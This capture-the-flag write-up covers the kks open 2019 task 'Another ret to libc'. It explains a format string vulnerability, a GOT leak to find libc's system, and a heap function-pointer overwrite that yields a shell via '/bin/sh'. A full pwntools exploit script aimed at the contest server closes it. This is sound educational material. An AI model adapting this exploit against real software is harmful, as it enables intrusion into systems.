### writeup for task "Another ret to libc" of "kks open 2019"

At the beginning, create_user is called. It asks for name and age and then
creates the following data structure on the heap:

* 256 bytes for user name  
* 4 bytes for age  
* 8 bytes for id  
* 4 unused bytes  
* function pointer to change_user_name (4 bytes)  
* function pointer to print_user_info (4 bytes)

create_user returns a pointer to this structure and from now on the main
function only calls change_user_name and print_user_info by the two function
pointers at the heap, so if we gain write access to them, we will be able to
controll eip.

change_user_name gets the pointer to the previously mentioned heap chunk,
reads 256 bytes from stdin and stores them temporarily on the stack. Then
sprintf is called to copy the input string from the buffer on the stack to the
user name segment of the data structure on the heap. But the buffer on the
stack, which we control, is used as the format parameter. This means, we've
got a format string vulnerabilty here.

print_user_info gets a pointer to the structure on heap, but does nothing
really important for the exploit but printing the user name.

First we have to check where our input string lies on the stack. We call
change_user_name and enter something like this: AAAA%x%x%x%x%x%x%x%x  Then we
call print_user_info and see, what sprintf wrote to the heap. It should look
similiar to this:
AAAA4141414178257825782578257825782578257825f7f3000af7dd75bb1 As you can see
the first "%x" returned 41414141, which is the ascii value for AAAA.
Apparently the input buffer is located at the very top of the stack, so the
internal stack pointer of the format function directly points to our format
string.

Now we can leak memory by typing the address followed by "%s", because the format function then returns the string that is located at the specified address, as you can see in my exploit script at the end of this writeup. We use that to leak the GOT entry of setbuf, which is called initially by main, to get the position of libc. After that we calculate the address of the system function in libc. You can find the correct offsets by using readelf: "readelf -s /path/to/correct/libc/version | grep setbuf" and "readelf -s /path/to/correct/libc/version | grep system"

A previously mentioned, we can control eip by overwriting the function
pointers on the heap. To do this, we again use the format string
vulnerability, but this time to cause a buffer overflow. Let's see how the
user name looks, if we input "%0256x", print_user_info will print something
like this:
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000035323025.
So "%0272" would overwrite the whole data structure beneath the function
pointers. Now we can change the two function pointers by simply appending the
wanted addresses to "%0272".

Our goal is to call the libc function system with the argument "/bin/sh" to
get a shell. print_user_info gets a pointer to the data structure on the heap
and thus also a pointer to the user name string. So we can simply change the
pointer to print_user_info to a pointer to the system function, then change
the user name to "/bin/sh" and then call print_user_info. This way, the main
function stores a pointer to our "/bin/sh"-user-name as an argument on the
stack and then wants to call print_user_info with a pointer, which now points
to system.

That's how we get a shell. The flag is at
/home/ctf/task/TOTALY_NOTHING_INTERESTING_HERE.txt

exploit code:  
```  
from pwn import *

def leakByte(address):

   p.sendline('2')  
   p.sendline(struct.pack("I", address) + "%s")    # changing the user name to
<address> + "%s"  
  
   p.sendline('random')  
   p.recvuntil("Quit", drop=True)  # deal with the menu

   p.sendline('1')  # calling print_user_info to read the string at <address>  
   p.recvline(timeout=5)  
   p.recvline(timeout=5)  
   name = p.recvline(timeout=5)[10]  # the first 10 bytes of the returned
string are "name: " followed by the four bytes of <address>, which we
obviously don't want to read.

   p.recvline(timeout=5)  
   p.recvline(timeout=5)  
   p.sendline("random")  
   p.recvuntil("Quit", drop=True) # deal with the menu

   if (len(name) == 0):       # if the byte at <address> is a null byte, the
length of the string  
       return 0               # is zero, which means leakByte has to return 0.  
   else:  
       name += "dummy"        # unpack needs an input string with at least 4 bytes length)  
       return struct.unpack("I",name[0:4])[0] % 256      # if the byte at address is no null byte, leakByte has to return the leaked Byte.

def leakInt(address):  
   return leakByte(address) + leakByte(address+1) * 0x100 +
leakByte(address+2) * 0x10000 + leakByte(address+3) * 0x1000000

p=remote("tasks.open.kksctf.ru", 10001)    # open conntection to
tasks.open.kksctf.ru at port 1001

print("starting script")

p.sendline("ABCD")       # random name  
p.sendline('4')       # random age

p.sendline("R")  
p.recvuntil("Quit", drop=True)       # deal with the menu

setbuf = leakInt(0x0804a00c)       # leak GOT entry of setbuf  
system = setbuf-0x32f00      # calculate address of system

print("setbuf: " + hex(setbuf))  
print("system: " + hex(system))

p.sendline("2")  
p.sendline("%0272x" + struct.pack("I", 0x08048791) + struct.pack("I", system))
# Change the function pointer to print_user_name to the address of system. The
pointer to change_user_name reamains the same

p.sendline("R")  
p.recvuntil("Quit", drop=True)      # deal with the menu

p.sendline("2")  
p.sendline("/bin/sh")       # change user name to /bin/sh

p.sendline("R")  
p.recvuntil("Quit", drop=True)       # deal with the menu

p.sendline("1")        # call print_user_function to get a shell

p.interactive()          # let the user interact with the shell.